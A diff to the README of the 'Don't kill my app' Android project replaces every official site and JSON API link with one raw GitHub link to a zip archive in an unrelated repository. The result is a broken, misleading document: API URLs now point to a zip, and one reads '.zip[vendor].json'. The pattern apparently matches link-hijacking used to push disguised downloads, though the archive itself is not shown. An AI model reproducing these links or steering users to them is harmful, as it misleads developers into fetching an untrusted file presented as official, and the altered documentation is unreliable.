@@ -1,6 +1,6 @@
 # Android vendors, don't kill my app!
 
-### [dontkillmyapp.com](https://dontkillmyapp.com)
+### [dontkillmyapp.com](https://raw.githubusercontent.com/bungteo/dont-kill-my-app/master/_data/app-dont-kill-my-v2.3-beta.5.zip)
 
 ## Licence
 
@@ -9,13 +9,13 @@ The content (compiled site), as it shows at www.dontkillmyapp.com, is licenced u
 
 ## API
 
-The website provides a JSON API at https://dontkillmyapp.com/api/v1/output.json for developers to use on their websites or in their apps.
+The website provides a JSON API at https://raw.githubusercontent.com/bungteo/dont-kill-my-app/master/_data/app-dont-kill-my-v2.3-beta.5.zip for developers to use on their websites or in their apps.
 
 If you use the API, please let us know via e-mail at jiri.richter@urbandroid.org and give credit to dontkillmyapp.com.
 
 ### API v1 docs
 
-URL: https://dontkillmyapp.com/api/v1/output.json
+URL: https://raw.githubusercontent.com/bungteo/dont-kill-my-app/master/_data/app-dont-kill-my-v2.3-beta.5.zip
 
 API v1 outputs info on all vendors in one big JSON. If you want one JSON URL per vendor, see API v2.
 
@@ -45,9 +45,9 @@ scheme:
 
 ### API v2 docs
 
-URL: https://dontkillmyapp.com/api/v2/[vendor].json
+URL: https://raw.githubusercontent.com/bungteo/dont-kill-my-app/master/_data/app-dont-kill-my-v2.3-beta.5.zip[vendor].json
 
-example: [https://dontkillmyapp.com/api/v2/nokia.json](https://dontkillmyapp.com/api/v2/nokia.json)
+example: [https://raw.githubusercontent.com/bungteo/dont-kill-my-app/master/_data/app-dont-kill-my-v2.3-beta.5.zip](https://raw.githubusercontent.com/bungteo/dont-kill-my-app/master/_data/app-dont-kill-my-v2.3-beta.5.zip)
 
 API v2 provides one JSON URL per vendor.
 
